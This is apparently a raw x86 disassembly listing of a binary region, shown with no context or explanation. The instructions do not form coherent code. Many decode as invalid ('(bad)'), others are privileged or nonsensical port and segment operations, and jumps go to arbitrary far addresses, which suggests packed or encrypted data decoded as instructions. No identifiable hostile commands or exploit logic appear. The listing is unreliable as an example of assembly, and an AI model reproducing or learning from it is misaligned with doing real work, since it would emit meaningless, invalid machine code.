  421e3a:	push   0xcf85075d
  421e3f:	test   DWORD PTR [esi+0x21968b38],ebx
  421e45:	cmp    ecx,eax
  421e47:	push   edx
  421e48:	xchg   DWORD PTR [ecx+0x45],esp
  421e4b:	or     al,BYTE PTR [esi+0x395c7154]
  421e51:	jb     0x421eb3
  421e53:	mov    esp,0x73379399
  421e58:	push   cs
  421e59:	dec    edi
  421e5a:	int3   
  421e5b:	loope  0x421e6c
  421e5d:	mov    BYTE PTR [ecx-0x3daff6bd],ch
  421e63:	leave  
  421e64:	dec    ecx
  421e65:	ins    DWORD PTR es:[edi],dx
  421e66:	lea    ebp,[edx+0x18]
  421e69:	cmp    bh,bh
  421e6b:	pushf  
  421e6c:	add    BYTE PTR [ecx+0x49d7ee15],0x33
  421e73:	inc    esi
  421e74:	sar    BYTE PTR [edi+0x51],0x78
  421e78:	push   0x2e
  421e7a:	and    BYTE PTR [esi-0x2acba632],bl
  421e80:	push   esp
  421e81:	jo     0x421ee1
  421e83:	fbstp  TBYTE PTR [ecx]
  421e85:	ror    BYTE PTR [esi+0xe],1
  421e88:	nop
  421e89:	inc    esp
  421e8a:	jmp    FWORD PTR [edi+0x7d]
  421e8d:	sub    bh,BYTE PTR [ebx-0x18]
  421e90:	outs   dx,BYTE PTR ds:[esi]
  421e91:	push   cs
  421e92:	stos   DWORD PTR es:[edi],eax
  421e93:	retf   0xc7c8
  421e96:	sub    ah,BYTE PTR [ebx+0x62]
  421e99:	ret    
  421e9a:	fcomi  st,st(6)
  421e9c:	aam    0x91
  421e9e:	loop   0x421e5f
  421ea0:	xchg   esp,eax
  421ea1:	cmp    esi,edi
  421ea3:	aam    0x8b
  421ea5:	mov    ebx,0x7a9f4e1e
  421eaa:	xchg   ebx,eax
  421eab:	jmp    0xbbf08f6c
  421eb0:	test   ch,0x87
  421eb3:	jge    0x421ee3
  421eb5:	daa    
  421eb6:	lahf   
  421eb7:	ins    DWORD PTR es:[edi],dx
  421eb8:	cli    
  421eb9:	loop   0x421e53
  421ebb:	add    eax,0xcf1209e7
  421ec0:	ror    DWORD PTR [ecx+0x12],cl
  421ec3:	fild   WORD PTR [edi]
  421ec5:	div    BYTE PTR [eax+0x27]
  421ec8:	jle    0x421eb2
  421eca:	jmp    0x8e6d7327
  421ecf:	addr16 dec esi
  421ed1:	out    dx,eax
  421ed2:	mov    esi,0x79148cf8
  421ed7:	out    dx,eax
  421ed8:	ret    
  421ed9:	sahf   
  421eda:	cld    
  421edb:	xchg   ebp,eax
  421edc:	add    eax,0x1686d6b9
  421ee1:	aad    0x42
  421ee3:	dec    esp
  421ee4:	int3   
  421ee5:	es dec esi
  421ee7:	push   ss
  421ee8:	lock or DWORD PTR [edi],esp
  421eeb:	loopne 0x421f01
  421eed:	jo     0x421ed1
  421eef:	push   eax
  421ef0:	mov    ecx,0x79f742a7
  421ef5:	mov    eax,ds:0xc1ccea31
  421efa:	adc    ecx,DWORD PTR ss:[edi-0x5b337500]
  421f01:	nop
  421f02:	(bad)  
  421f03:	jmp    0x98cb30fc
  421f08:	(bad)  
  421f09:	xchg   ebp,eax
  421f0a:	ins    DWORD PTR es:[edi],dx
  421f0b:	jne    0x421e91
  421f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f0e:	cmp    ch,dh
  421f10:	(bad)  
  421f11:	fcmovb st,st(7)
  421f13:	cmp    ecx,ebx
  421f15:	sub    al,0xb4
  421f17:	xor    BYTE PTR [esi-0x3b],bl
  421f1a:	clc    
  421f1b:	punpckldq mm7,mm1
  421f1e:	jns    0x421f3d
  421f20:	push   ds
  421f21:	loope  0x421f2d
  421f23:	out    0x47,al
  421f25:	jp     0x421fa3
  421f27:	xchg   edx,eax
  421f28:	mov    ebp,0x96e286bc
  421f2d:	jecxz  0x421f8e
  421f2f:	ja     0x421fac
  421f31:	mov    esp,0x8f2e01
	...
  421f96:	imul   eax,DWORD PTR [esi],0xffffff8f
  421f99:	dec    edi
  421f9a:	out    dx,eax
  421f9b:	iret   
  421f9c:	jmp    0x421fc4
  421f9e:	das    
  421f9f:	mov    esi,0xeb47af78
  421fa4:	and    eax,DWORD PTR [edi]
  421fa6:	pop    es
  421fa7:	imul   eax,DWORD PTR [ecx],0x10700
  421fad:	add    BYTE PTR [esi+0x59],cl
  421fb0:	fnstsw ax
  421fb2:	jmp    0xb091c82f
  421fb7:	or     DWORD PTR [ebx-0x15],ebx
  421fba:	jge    0x42201c
  421fbc:	imul   eax,edi,0x2f
  421fbf:	or     BYTE PTR [ecx-0x21],0xed
  421fc3:	mov    WORD PTR [ecx-0x6f],cs
  421fc6:	dec    eax
  421fc7:	or     eax,DWORD PTR [eax-0x25]
  421fca:	add    ah,BYTE PTR [edx]
  421fcc:	jmp    DWORD PTR [ecx+0x38]
  421fcf:	mov    al,0x1a
  421fd1:	pop    ecx
  421fd2:	push   edx
  421fd3:	cmp    ebx,0x5c
  421fd6:	ret    
  421fd7:	(bad)  
  421fd8:	icebp  
  421fd9:	add    ah,BYTE PTR [esi-0x898dd56]
  421fdf:	push   0x36
  421fe1:	sub    eax,0x95e725b2
  421fe6:	test   eax,0xdac85b17
  421feb:	or     ah,ah
  421fed:	jne    0x421fab
  421fef:	mov    esp,edi
  421ff1:	cli    
  421ff2:	inc    esi
  421ff3:	push   edx
  421ff4:	shr    BYTE PTR [eax-0x7a],0xc
  421ff8:	outs   dx,BYTE PTR ds:[esi]
  421ff9:	pop    ss
  421ffa:	inc    ebx
  421ffb:	lahf   
  421ffc:	fucomi st,st(7)
  421ffe:	mov    cs,WORD PTR [ebx-0x4f5d3006]
  422004:	cwde   
  422005:	ja     0x422055
  422007:	test   DWORD PTR [ebx+0x14],ebp
  42200a:	mov    ch,BYTE PTR [ecx+0x3c6d21ba]
  422010:	sub    edi,esi
  422012:	inc    ebp
  422013:	imul   BYTE PTR [eax*8+0x7dd6b95a]
  42201a:	or     eax,0xbb70595f
  42201f:	fcomp  QWORD PTR [ecx-0x76]
  422022:	push   ebp
  422023:	int    0x3c
  422025:	sar    bh,0xa7
  422028:	or     BYTE PTR [eax],bl
  42202a:	sbb    edx,DWORD PTR [esi-0x40]
  42202d:	clc    
  42202e:	jns    0x42204d
  422030:	clc    
  422031:	outs   dx,DWORD PTR ds:[esi]
  422032:	es pop edi
  422034:	mov    ch,0x62
  422036:	cmc    
  422037:	xor    ecx,DWORD PTR [esi]
  422039:	mov    DWORD PTR [edi],0xca0a55f
  42203f:	or     al,0xf5
  422041:	ret    0xdb7
  422044:	shl    BYTE PTR [esi+0x9],0xd5
  422048:	xchg   esp,eax
  422049:	adc    cl,BYTE PTR [edx+0x1d]
  42204c:	mov    ah,0xa
  42204e:	pop    eax
  42204f:	adc    DWORD PTR [ebp+0x8fead9f],edx
  422055:	dec    eax
  422056:	cmp    BYTE PTR [edx],ah
  422058:	mov    eax,ds:0x51294f27
  42205d:	inc    ebx
  42205e:	mov    al,ds:0x1aa7d9be
  422063:	inc    ebp
  422064:	ins    BYTE PTR es:[edi],dx
  422065:	nop
  422066:	mov    esp,0xae25689a
  42206c:	fdivrp st(3),st
  42206e:	and    ah,BYTE PTR [edi-0x34]
  422071:	cmp    cl,BYTE PTR [ebp+0x3d309544]
  422077:	gs xchg ecx,eax
  422079:	mov    cl,ah
  42207b:	sbb    DWORD PTR [eax],edx
  42207d:	int    0x93
  42207f:	lock fist DWORD PTR [ecx-0x5036807e]
  422086:	(bad)  
  422087:	in     al,dx
  422088:	pop    esp
  422089:	mov    ds:0xc8cd9493,al
  42208e:	mov    bh,0x2b
  422090:	add    ebp,ebx
  422092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422093:	sub    BYTE PTR [edx],dl
  422095:	xor    bh,dl
  422097:	cmp    bl,BYTE PTR [eax-0x2a]
  42209a:	jle    0x422083
  42209c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42209d:	ffreep st(0)
  42209f:	mov    bh,0x93
  4220a1:	call   0x6892555e
  4220a6:	adc    eax,0x798c43a2
  4220ab:	jno    0x4220f5
  4220ad:	push   0xe8774190
  4220b2:	aad    0xd1
  4220b4:	mov    ebx,0x0
	...
  422115:	add    BYTE PTR [esi-0x284ae],ah
  42211b:	std    
  42211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42211d:	pop    ebx
  42211e:	or     ebx,ebp
  422120:	retf   0x55c
  422123:	out    dx,al
  422124:	(bad)  
  422125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422126:	push   cs
  422127:	push   0x1
  422129:	add    BYTE PTR [edi],al
  42212b:	add    DWORD PTR [eax],eax
  42212d:	add    cl,ch
  42212f:	pop    esp
  422130:	xchg   edi,eax
  422131:	aas    
  422132:	dec    eax
  422133:	test   ecx,ebp
  422135:	cmp    DWORD PTR [ebx*2+0x36ec0718],edi
  42213c:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42213e:	or     eax,DWORD PTR [ebp-0x56]
  422141:	test   DWORD PTR ds:0xc865c47b,esp
  422147:	mov    cl,0x5c
  422149:	sbb    DWORD PTR [esi+0x4],0x7f96008d
  422150:	popf   
  422151:	xor    DWORD PTR [edi+edx*8-0x76],ebp
  422155:	stos   BYTE PTR es:[edi],al
  422156:	and    DWORD PTR [ecx],ebp
  422158:	sbb    al,bl
  42215a:	sub    al,0x57
  42215c:	mov    cl,0x42
  42215e:	or     eax,0x8cc60321
  422163:	stos   DWORD PTR es:[edi],eax
  422164:	push   ss
  422165:	sub    BYTE PTR [ecx+0x4c],al
  422168:	das    
  422169:	inc    ebx
  42216a:	mov    ecx,DWORD PTR [edx]
  42216c:	jmp    0x31533602
  422171:	and    dl,BYTE PTR [ebx-0x522306b9]
  422177:	mov    ds:0x49a5c809,eax
  42217c:	js     0x42211f
  42217e:	call   0xad11a758
  422183:	fwait
  422184:	fwait
  422185:	push   edi
  422186:	icebp  
  422187:	jb     0x4221e8
  422189:	cwde   
  42218a:	ror    BYTE PTR [ebp+0x512dd35a],0x13
  422191:	cld    
  422192:	ret    
  422193:	aaa    
  422194:	dec    ebx
  422195:	mov    ah,0x25
  422197:	pop    ds
  422198:	je     0x422136
  42219a:	pop    ss
  42219b:	into   
  42219c:	sub    DWORD PTR [eax],esi
  42219e:	mov    ch,0xff
  4221a0:	nop
  4221a1:	shl    cl,cl
  4221a3:	ins    BYTE PTR es:[edi],dx
  4221a4:	addr16 pop ss
  4221a6:	and    eax,0xd6371da1
  4221ab:	fsub   DWORD PTR [ecx+0x3f]
  4221ae:	xchg   esp,eax
  4221af:	adc    edi,edi
  4221b1:	sbb    BYTE PTR [eax-0x48],ch
  4221b4:	jmp    0x4221c4
  4221b6:	fld    QWORD PTR [ecx-0x1d33c464]
  4221bc:	in     eax,0xba
  4221be:	bound  eax,QWORD PTR [edx]
  4221c0:	cmc    
  4221c1:	jmp    0x561:0x32b1bcc4
  4221c8:	lahf   
  4221c9:	pop    eax
  4221ca:	sar    DWORD PTR [ecx+eax*4+0x16b74652],0x46
  4221d2:	ss jae 0x4221e8
  4221d5:	push   cs
  4221d6:	js     0x4221f6
  4221d8:	push   0xe4ecdaf4
  4221dd:	shl    DWORD PTR [ebp+edx*8+0x69],cl
  4221e1:	cmp    DWORD PTR ds:0x2821400e,edi
  4221e7:	mov    cl,BYTE PTR [ecx]
  4221e9:	js     0x4221a1
  4221eb:	xor    bh,BYTE PTR [edi]
  4221ed:	outs   dx,BYTE PTR ds:[esi]
  4221ee:	std    
  4221ef:	(bad)  
  4221f0:	mov    ecx,0xef7d298c
  4221f5:	add    DWORD PTR [ecx],0x79
  4221f8:	mov    ah,0x82
  4221fa:	(bad)  
  4221fc:	in     eax,0x59
  4221fe:	jg     0x422252
  422200:	retf   0xf13f
  422203:	inc    edi
  422204:	ficom  DWORD PTR [ebp-0x3c]
  422207:	mov    ah,dh
  422209:	and    BYTE PTR [eax+0x46],bl
  42220c:	call   0x87a46b58
  422211:	push   ss
  422212:	pusha  
  422213:	inc    ecx
  422214:	jmp    0xbb0f:0xc9be524a
  42221b:	repz fnstcw WORD PTR [ebx+0x62b86ca4]
  422222:	jp     0x4221a8
  422224:	fld    QWORD PTR [edx]
  422226:	rcr    DWORD PTR [ebx*8+0x25cf6b79],cl
  42222d:	in     eax,dx
  42222e:	divps  xmm7,xmm4
  422231:	lds    ebx,FWORD PTR [ebp+0x4d1c]
	...
  422293:	add    BYTE PTR [eax],al
  422295:	add    BYTE PTR [edi-0x10085213],cl
  42229b:	neg    edi
  42229d:	std    
  42229e:	fsubr  DWORD PTR [edi-0x12]
  4222a1:	adc    esi,DWORD PTR [ecx]
  4222a3:	inc    esp
  4222a4:	lea    eax,[ebx]
  4222a6:	adc    eax,0x700016b
  4222ab:	add    DWORD PTR [eax],eax
  4222ad:	add    BYTE PTR [edi],bh
  4222af:	sbb    eax,0x6b660cf9
  4222b4:	xchg   BYTE PTR [ebp-0x36e7f7c0],ah
  4222ba:	bound  ebx,QWORD PTR [esi-0x12]
  4222bd:	push   ebp
  4222be:	jne    0x42228f
  4222c0:	pop    ebp
  4222c1:	fstp   st(0)
  4222c3:	adc    eax,0x2a558ca5
  4222c8:	aas    
  4222c9:	loop   0x422287
  4222cb:	add    DWORD PTR [esi],ecx
  4222cd:	mov    ds:0xfe9f68a7,al
  4222d2:	popf   
  4222d3:	push   cs
  4222d4:	push   cs
  4222d5:	rol    bl,cl
  4222d7:	call   0xfd9e8319
  4222dc:	jno    0x422310
  4222de:	xor    al,0xd6
  4222e0:	xor    al,BYTE PTR [edi+0x30]
  4222e3:	(bad)  
  4222e4:	ss xchg ebx,eax
  4222e6:	stc    
  4222e7:	xchg   ecx,eax
  4222e8:	mov    bh,0x2
  4222ea:	adc    esi,DWORD PTR [edi-0x6ae51a3e]
  4222f0:	jp     0x4222ec
  4222f2:	aaa    
  4222f3:	aas    
  4222f4:	push   ebx
  4222f5:	sahf   
  4222f6:	jmp    0x4222f9
  4222f8:	test   al,0x92
  4222fa:	xchg   ebp,eax
  4222fb:	or     edx,eax
  4222fd:	cmp    DWORD PTR [eax],0xffffffe6
  422300:	fidiv  WORD PTR [edi+0x3f6a3ab0]
  422306:	mov    DWORD PTR ds:0x688b2d0b,esp
  42230c:	out    0x12,al
  42230e:	popf   
  42230f:	cmp    BYTE PTR [esi+0x594b0b1b],0x62
  422316:	dec    edi
  422317:	jmp    0x422344
  422319:	xchg   ebp,eax
  42231a:	int3   
  42231b:	loope  0x4222bc
  42231d:	stos   BYTE PTR es:[edi],al
  42231e:	dec    ecx
  42231f:	adc    al,0x97
  422321:	or     DWORD PTR [eax+eax*4],0x34
  422325:	push   edx
  422326:	fld    QWORD PTR [esi-0x21]
  422329:	and    esp,edi
  42232b:	mov    gs,WORD PTR fs:[ebx+0xa]
  42232f:	lods   al,BYTE PTR ds:[esi]
  422330:	test   al,0x4a
  422332:	xchg   edi,eax
  422333:	out    0x23,al
  422335:	sbb    ah,0xda
  422338:	and    eax,0x182a977a
  42233d:	jge    0x4222fb
  42233f:	sahf   
  422340:	fld    QWORD PTR [esi]
  422342:	outs   dx,BYTE PTR ds:[esi]
  422343:	dec    esp
  422344:	xchg   ebx,eax
  422345:	push   es
  422346:	rol    DWORD PTR [esi],1
  422348:	out    0x88,al
  42234a:	loop   0x422386
  42234c:	mov    eax,ds:0xae905e32
  422351:	xor    ebx,DWORD PTR [ebx]
  422353:	cli    
  422354:	(bad)  
  422355:	and    esi,DWORD PTR [esp+edi*4+0x124f7c46]
  42235c:	dec    ebx
  42235d:	daa    
  42235e:	mov    eax,ds:0xb9379f03
  422363:	mov    ebp,0xdc628c32
  422368:	sti    
  422369:	ja     0x42237a
  42236b:	aad    0x55
  42236d:	dec    ebp
  42236e:	and    DWORD PTR [eax-0x61f80b7f],ebp
  422374:	sbb    esi,DWORD PTR [ebp-0x3bd78fa7]
  42237a:	ror    DWORD PTR [eax-0x44d7657e],cl
  422380:	jns    0x4223cf
  422382:	push   cs
  422383:	pushf  
  422384:	inc    eax
  422385:	out    dx,eax
  422386:	(bad)  
  422387:	jmp    0xf35865d6
  42238c:	iret   
  42238d:	test   al,0x5f
  42238f:	cmc    
  422390:	sbb    al,bl
  422392:	cs call 0xae048c41
  422398:	scas   al,BYTE PTR es:[edi]
  422399:	cs push cs
  42239b:	push   eax
  42239c:	rol    DWORD PTR [edi-0x323199c6],0xf7
  4223a3:	push   esi
  4223a4:	fwait
  4223a5:	xor    DWORD PTR [ebp-0x63],esi
  4223a8:	xchg   ecx,eax
  4223a9:	adc    BYTE PTR ds:0xac42b6f7,dl
  4223af:	test   eax,0x6f7d127c
  4223b4:	leave  
	...
  422415:	add    BYTE PTR [edx-0x7e],dl
  422418:	cs imul edi,esi,0x88bb57ed
  42241f:	adc    eax,0x6365b6
  422424:	xor    al,0x48
  422426:	sbb    al,0x6c
  422428:	add    DWORD PTR [eax],eax
  42242a:	pop    es
  42242b:	add    DWORD PTR [eax],eax
  42242d:	add    BYTE PTR [ecx+ebp*4],dh
  422430:	lods   eax,DWORD PTR ds:[esi]
  422431:	add    eax,0x33f2a5b2
  422436:	jmp    0xb5421cb2
  42243b:	daa    
  42243c:	data16 lock out dx,al
  42243f:	lods   eax,DWORD PTR ds:[esi]
  422440:	imul   edx,ebp,0x28
  422443:	out    0xde,al
  422445:	and    edx,DWORD PTR [esp+eiz*2+0x6a1c51a7]
  42244c:	test   ecx,0x1a40a784
  422452:	rol    DWORD PTR [ebp+0x4da3a136],cl
  422458:	fs cdq 
  42245a:	cmp    ebp,DWORD PTR [ebp+0x50]
  42245d:	cli    
  42245e:	push   es
  42245f:	out    0x4d,al
  422461:	push   ss
  422462:	jl     0x422463
  422464:	rcl    BYTE PTR [edx-0x42],0x8c
  422468:	bound  edx,QWORD PTR [edx-0x15b64ada]
  42246e:	inc    edx
  42246f:	cmp    DWORD PTR [esp+edi*2],edx
  422472:	les    edx,FWORD PTR [eax]
  422474:	xchg   ecx,eax
  422475:	out    0xbd,al
  422477:	rol    DWORD PTR [edx-0x344f1104],1
  42247d:	or     eax,0x9ad97531
  422482:	add    dh,BYTE PTR [ebx-0x7c]
  422485:	inc    eax
  422486:	mov    esi,0xd452431e
  42248b:	mov    bh,0x78
  42248d:	xor    DWORD PTR [ebx+0x55d43fed],0x36
  422494:	dec    edi
  422495:	enter  0xb328,0x5c
  422499:	mov    ecx,0xc32f82c4
  42249f:	pushf  
  4224a0:	ffreep st(7)
  4224a2:	aam    0x46
  4224a4:	into   
  4224a5:	popa   
  4224a6:	in     al,0xd0
  4224a8:	cli    
  4224a9:	cmp    esi,ebx
  4224ab:	scas   eax,DWORD PTR es:[edi]
  4224ac:	xchg   DWORD PTR [edi],ecx
  4224ae:	push   cs
  4224af:	adc    BYTE PTR [edx+eax*2-0x7c],dh
  4224b3:	retf   
  4224b4:	dec    eax
  4224b5:	jge    0x4224a8
  4224b7:	push   ecx
  4224b8:	mov    cl,0x87
  4224ba:	dec    ecx
  4224bb:	lods   eax,DWORD PTR ds:[esi]
  4224bc:	jb     0x42250e
  4224be:	ins    BYTE PTR es:[edi],dx
  4224bf:	nop
  4224c0:	les    ecx,FWORD PTR [esi+0x32]
  4224c3:	dec    edi
  4224c4:	jbe    0x4224dc
  4224c6:	add    eax,0x3958359
  4224cb:	out    0xaf,eax
  4224cd:	adc    al,0x56
  4224cf:	fld    DWORD PTR [edi-0x2392d918]
  4224d5:	(bad)  
  4224d6:	pushf  
  4224d7:	bnd ret 0xddf4
  4224db:	mov    dl,0xa4
  4224dd:	push   ds
  4224de:	and    eax,0x854a4589
  4224e3:	fcomp  QWORD PTR [eax-0x35]
  4224e6:	call   0xe167763c
  4224eb:	or     DWORD PTR [edi],ebx
  4224ed:	cli    
  4224ee:	push   0x2060d5e5
  4224f3:	fiadd  WORD PTR [edx+esi*4-0x72beaa43]
  4224fa:	leave  
  4224fb:	dec    ebx
  4224fc:	cli    
  4224fd:	or     DWORD PTR [edx-0x1],edx
  422500:	aaa    
  422501:	mov    ah,0xd2
  422503:	fs jno 0x42249b
  422506:	sub    al,BYTE PTR [ebp+0x37]
  422509:	adc    eax,DWORD PTR [ebx+ebp*2+0x7c]
  42250d:	mov    bh,BYTE PTR [ecx-0x5530e14d]
  422513:	xchg   ecx,eax
  422514:	sbb    BYTE PTR [esi+0x58],cl
  422517:	stos   BYTE PTR es:[edi],al
  422518:	cdq    
  422519:	std    
  42251a:	xchg   edx,eax
  42251b:	inc    ebp
  42251c:	push   ds
  42251d:	add    BYTE PTR [edi],cl
  42251f:	mov    DWORD PTR [esi+0x2bd335fc],ebx
  422525:	mov    ebx,0x365709f8
  42252a:	popa   
  42252b:	mov    edi,0x84ccf9ac
  422530:	les    ebx,FWORD PTR [ecx]
  422532:	push   esi
  422533:	retf   0x81
	...
  422596:	call   0xfa77:0xbf778fae
  42259d:	out    dx,eax
  42259e:	and    ebx,DWORD PTR [esi]
  4225a0:	outs   dx,DWORD PTR ds:[esi]
  4225a1:	fdivr  DWORD PTR [edi]
  4225a3:	add    al,0xb1
  4225a5:	out    0x23,eax
  4225a7:	ins    DWORD PTR es:[edi],dx
  4225a8:	add    DWORD PTR [eax],eax
  4225aa:	pop    es
  4225ab:	add    DWORD PTR [eax],eax
  4225ad:	add    BYTE PTR [ebx-0x76e426cd],al
  4225b3:	jmp    0x42260d
  4225b5:	xchg   esi,eax
  4225b6:	adc    al,0xcb
  4225b8:	adc    DWORD PTR [esi-0x3e22d304],ecx
  4225be:	test   eax,0xd9c855b
  4225c3:	mov    eax,DWORD PTR [eax]
  4225c5:	xor    al,0x68
  4225c7:	jg     0x4225c1
  4225c9:	js     0x42255b
  4225cb:	cmp    eax,0x5b236a56
  4225d0:	xor    BYTE PTR [esi-0x6aaf10d6],cl
  4225d6:	dec    esi
  4225d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225d8:	push   edx
  4225d9:	jmp    0x3096:0x9062ba37
  4225e0:	inc    eax
  4225e1:	ins    BYTE PTR es:[edi],dx
  4225e2:	ja     0x4225b6
  4225e4:	dec    eax
  4225e5:	out    0x8c,al
  4225e7:	inc    esp
  4225e8:	xchg   edi,eax
  4225e9:	mov    edi,0xc7a00caf
  4225ee:	mov    edx,DWORD PTR [ebp-0x4e]
  4225f1:	and    BYTE PTR [eax+ebx*2+0x27c24f09],bh
  4225f8:	and    edi,DWORD PTR [eax]
  4225fa:	pop    ss
  4225fb:	sbb    al,0x75
  4225fd:	sub    al,0x7f
  4225ff:	sub    eax,0x167c012
  422604:	(bad)  
  422605:	pop    ds
  422606:	pop    esp
  422607:	jnp    0x4225c5
  422609:	xchg   edi,eax
  42260a:	loope  0x4225aa
  42260c:	in     al,0x46
  42260e:	sbb    BYTE PTR [ebx-0x34],dl
  422611:	pop    esi
  422612:	adc    eax,0x397e0dce
  422617:	mov    ebp,0x20712eb8
  42261c:	xchg   edx,eax
  42261d:	cmp    al,0x43
  42261f:	add    al,bl
  422621:	inc    ebp
  422622:	enter  0x2016,0x2d
  422626:	sbb    al,0x5d
  422628:	push   0x51
  42262a:	cmp    esp,DWORD PTR [bp+si+0x65]
  42262e:	sbb    DWORD PTR [edi],ebp
  422630:	mov    WORD PTR [edi-0x6bd75b16],gs
  422636:	push   edx
  422637:	imul   ebx,DWORD PTR [esi-0x4f],0xffffffc6
  42263b:	push   edi
  42263c:	dec    esp
  42263d:	dec    ebp
  42263e:	ss dec ecx
  422640:	stos   BYTE PTR es:[edi],al
  422641:	or     esi,DWORD PTR [edi-0x4ff5e6f0]
  422647:	dec    ebp
  422648:	cdq    
  422649:	mov    dl,0x2e
  42264b:	pusha  
  42264c:	or     BYTE PTR ds:0x33f52600,al
  422652:	push   ds
  422653:	and    ecx,edx
  422655:	test   BYTE PTR [ebx+0x26],bl
  422658:	inc    eax
  422659:	aas    
  42265a:	popf   
  42265b:	mov    edi,edx
  42265d:	xor    BYTE PTR ds:0xb513f3b5,0x8f
  422664:	std    
  422665:	call   0x18b0d0ae
  42266a:	xlat   BYTE PTR ds:[ebx]
  42266b:	aas    
  42266c:	outs   dx,BYTE PTR ds:[esi]
  42266d:	popf   
  42266e:	loope  0x4226dc
  422670:	loop   0x422687
  422672:	mov    edi,0x497dbdab
  422677:	fild   DWORD PTR [eax-0x3c475f4c]
  42267d:	jmp    0x422637
  42267f:	adc    DWORD PTR [ecx],ecx
  422681:	inc    eax
  422682:	shl    DWORD PTR [edx+0x4d118cd0],0x38
  422689:	out    dx,al
  42268a:	(bad)  
  42268b:	mov    edx,0xce3392ad
  422690:	sbb    dl,BYTE PTR [ebp+eax*8-0x40a7e643]
  422697:	pop    ebx
  422699:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42269a:	mov    al,ds:0xb000cecb
  42269f:	mov    ds:0xfd716d0b,eax
  4226a4:	xchg   ebp,eax
  4226a5:	push   eax
  4226a6:	push   0x76
  4226a8:	cwde   
  4226a9:	out    0x57,al
  4226ab:	adc    DWORD PTR [edx],0x1a
  4226ae:	test   bh,0xaa
  4226b1:	repz cmc 
  4226b3:	mov    bh,bh
	...
  422715:	add    BYTE PTR [edi],ah
  422717:	sub    eax,0x7d7f2d7d
  42271c:	ja     0x42274d
  42271e:	aad    0x21
  422720:	add    al,0x2f
  422722:	(bad)  
  422723:	xchg   DWORD PTR [eax+esi*8+0x2a],ebp
  422727:	outs   dx,BYTE PTR ds:[esi]
  422728:	add    DWORD PTR [eax],eax
  42272a:	pop    es
  42272b:	add    DWORD PTR [eax],eax
  42272d:	add    BYTE PTR [ecx+0x63],bl
  422730:	adc    DWORD PTR [edi+0x74],0x7d
  422734:	inc    edx
  422735:	xor    eax,DWORD PTR [eax-0x7a]
  422738:	jecxz  0x422763
  42273a:	mov    cl,0x0
  42273c:	addr16 test al,0x5f
  42273f:	out    dx,al
  422740:	pop    eax
  422741:	enter  0xaad,0x1d
  422745:	xor    DWORD PTR [esp+ebx*4],ebp
  422748:	jmp    0x562bb3ba
  42274d:	cmp    al,0x1f
  42274f:	inc    ebp
  422750:	pop    ds
  422751:	fisub  DWORD PTR [esi+0x15d822fa]
  422757:	or     al,0x11
  422759:	inc    esp
  42275a:	out    dx,al
  42275b:	mov    ds:0x20b1fc8,al
  422760:	daa    
  422761:	adc    ah,BYTE PTR [esi]
  422763:	inc    esp
  422764:	add    dl,0x6d
  422767:	fcmove st,st(3)
  422769:	dec    esi
  42276a:	and    BYTE PTR [eax-0x4a7afb6f],dh
  422770:	pop    esp
  422771:	ror    DWORD PTR es:[esi-0x57c79724],1
  422778:	cld    
  422779:	sti    
  42277a:	test   al,0x6c
  42277c:	mov    ebp,0x9a76640d
  422781:	jg     0x422712
  422783:	fisubr DWORD PTR [edx-0x1d]
  422786:	cmp    BYTE PTR [ebx],0x9e
  422789:	ja     0x4227d6
  42278b:	dec    ebp
  42278c:	je     0x4227f9
  42278e:	aad    0x22
  422790:	xchg   dx,ax
  422792:	mov    esp,0xe5862940
  422797:	sbb    esi,ecx
  422799:	rol    BYTE PTR [edi+edx*8-0x69],1
  42279d:	push   ebx
  42279e:	jnp    0x4227b9
  4227a0:	fimul  DWORD PTR [ebp+0x39]
  4227a3:	push   esi
  4227a4:	in     eax,0xf8
  4227a6:	cld    
  4227a7:	push   ss
  4227a8:	push   0xffffffb4
  4227aa:	push   edi
  4227ab:	inc    ebp
  4227ac:	out    dx,eax
  4227ad:	out    dx,al
  4227ae:	jbe    0x422785
  4227b0:	mov    ah,0xb8
  4227b2:	mov    eax,ds:0x656fa0bd
  4227b7:	cmp    edx,DWORD PTR [eax+edx*2]
  4227ba:	mov    ?,WORD PTR [esi+0x2a5906a9]
  4227c0:	int    0x40
  4227c2:	inc    eax
  4227c3:	btc    DWORD PTR [ebx+0x59],ebp
  4227c7:	mov    dh,0xbe
  4227c9:	push   esi
  4227ca:	xchg   bh,dh
  4227cc:	imul   ecx,DWORD PTR [ecx+0x8b49770],0x36
  4227d3:	fisttp QWORD PTR [esi+0x5e7e78ec]
  4227d9:	ret    
  4227da:	ins    BYTE PTR es:[edi],dx
  4227db:	sub    ch,BYTE PTR [edx+0x7]
  4227de:	mov    eax,0xf4997cb0
  4227e3:	jmp    0x422810
  4227e5:	cmp    eax,0x7f247fbe
  4227ea:	int    0xe4
  4227ec:	aad    0x27
  4227ee:	lahf   
  4227ef:	retf   
  4227f0:	lds    eax,FWORD PTR [edi-0x3f]
  4227f3:	jecxz  0x4227b1
  4227f5:	jecxz  0x422798
  4227f7:	pop    ebx
  4227f8:	scas   al,BYTE PTR es:[edi]
  4227f9:	sbb    al,0xfa
  4227fb:	into   
  4227fc:	mov    ah,0x97
  4227fe:	inc    ebx
  4227ff:	xor    al,0xbe
  422801:	mov    edi,0x5c5c133f
  422806:	lods   al,BYTE PTR ds:[esi]
  422807:	clc    
  422808:	jmp    0x91a3:0x7d3ebf3
  42280f:	mov    cl,0xcb
  422811:	push   es
  422812:	cli    
  422813:	and    eax,0x23a4fa29
  422818:	pop    edi
  422819:	in     al,dx
  42281a:	cmp    edx,DWORD PTR ds:0x3040fdfe
  422820:	ror    DWORD PTR [ebx+ebx*1+0x24],cl
  422824:	jb     0x42284f
  422826:	sub    eax,0xeeb83102
  42282b:	push   edx
  42282c:	push   0x4a
  42282e:	(bad)  
  42282f:	in     eax,0xc8
  422831:	scas   eax,DWORD PTR es:[edi]
  422832:	mov    bl,dl
  422834:	data16 add BYTE PTR [eax],al
	...
  422893:	add    BYTE PTR [eax],al
  422895:	add    ch,cl
  422897:	cmp    DWORD PTR [eax-0x10680369],edi
  42289d:	jnp    0x42284b
  42289f:	inc    ebx
  4228a0:	cmp    bl,BYTE PTR [ecx+eax*1]
